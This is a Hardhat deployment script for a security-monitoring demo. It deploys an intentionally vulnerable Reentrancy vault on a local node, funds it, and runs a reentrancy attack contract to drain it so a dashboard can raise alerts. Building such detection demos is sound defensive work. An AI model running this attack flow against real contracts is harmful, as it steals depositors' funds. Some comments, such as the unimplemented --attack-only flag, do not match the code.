import { network } from "hardhat";

/**
 * Deploys Reentrancy.sol onto the SHARED Hardhat node (http://127.0.0.1:8545), funds it,
 * then runs a REAL on-chain reentrancy attack against it using ReentrancyAttacker.sol.
 *
 * NOTE: this deploys Reentrancy.sol, not MultiVulnerable.sol. ReentrancyAttacker.sol's
 * interface expects a no-argument withdraw() that drains the caller's whole balance -
 * that's Reentrancy.sol's signature. MultiVulnerable.withdraw(uint256) has a different
 * selector, so calling it through this attacker would just revert. Use MultiVulnerable
 * for the Scan Contract / Static Findings part of the demo (it has all 6 static bug
 * classes for that detector walkthrough) and Reentrancy.sol for this live on-chain attack.
 *
 * Because this runs against the shared node (not an in-process one), the Java backend's
 * RuntimeMonitorService sees every block and transaction here live - register the printed
 * address in the Registry BEFORE running the attack so the dashboard picks it up.
 *
 * Usage:
 *   1) docker compose up            (node must be running on :8545)
 *   2) npx hardhat run scripts/deploy-and-attack.js
 *   3) copy the "Vault deployed at" address into Registry -> Register contract
 *   4) npx hardhat run scripts/deploy-and-attack.js --network localhost -- --attack-only <address>
 *      (or just re-run this script - see ATTACK_ONLY below)
 */
async function main() {
  const { ethers } = await network.create("localhost");
  const [, alice, bob, attackerOwner] = await ethers.getSigners();

  // Set this to an already-deployed MultiVulnerable address (from a previous run) to skip
  // redeploying and go straight to the attack - useful once it's registered in the UI.
  const EXISTING_VAULT = process.env.VAULT_ADDRESS || null;

  let vault;
  if (EXISTING_VAULT) {
    vault = await ethers.getContractAt("Reentrancy", EXISTING_VAULT);
    console.log("Using existing vault at:", EXISTING_VAULT);
  } else {
    const Vault = await ethers.getContractFactory("Reentrancy");
    vault = await Vault.deploy();
    await vault.waitForDeployment();
    console.log("Vault deployed at:", await vault.getAddress());

    await vault.connect(alice).deposit({ value: ethers.parseEther("5") });
    await vault.connect(bob).deposit({ value: ethers.parseEther("3") });
    console.log("Alice deposited 5 ETH, Bob deposited 3 ETH (vault balance: 8 ETH)");

    console.log("\n>>> Register this address in the dashboard now, then re-run with:");
    console.log(`    VAULT_ADDRESS=${await vault.getAddress()} npx hardhat run scripts/deploy-and-attack.js\n`);
    if (!EXISTING_VAULT) return; // deploy-only run: stop here so you can register it first
  }

  const vaultAddress = await vault.getAddress();
  const balanceBefore = await ethers.provider.getBalance(vaultAddress);
  console.log("Vault balance before attack:", ethers.formatEther(balanceBefore), "ETH");

  const Attacker = await ethers.getContractFactory("ReentrancyAttacker", attackerOwner);
  const attacker = await Attacker.deploy(vaultAddress);
  await attacker.waitForDeployment();
  console.log("Attacker deployed at:", await attacker.getAddress());

  const attackerBalanceBefore = await ethers.provider.getBalance(attackerOwner.address);

  const tx = await attacker.connect(attackerOwner).attack({ value: ethers.parseEther("1") });
  const receipt = await tx.wait();
  console.log("Attack tx mined in block", receipt.blockNumber, "- gas used:", receipt.gasUsed.toString());

  const balanceAfter = await ethers.provider.getBalance(vaultAddress);
  const attackerBalanceAfter = await ethers.provider.getBalance(attackerOwner.address);

  console.log("\n=== RESULT ===");
  console.log("Vault balance after:   ", ethers.formatEther(balanceAfter), "ETH");
  console.log("Attacker net ETH change:", ethers.formatEther(attackerBalanceAfter - attackerBalanceBefore), "ETH (gas-inclusive)");
  console.log("Funds drained from vault:", ethers.formatEther(balanceBefore - balanceAfter), "ETH");
  console.log("================\n");
  console.log("Check Runtime Monitor and Alerts in the dashboard - this should already have raised an event.");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
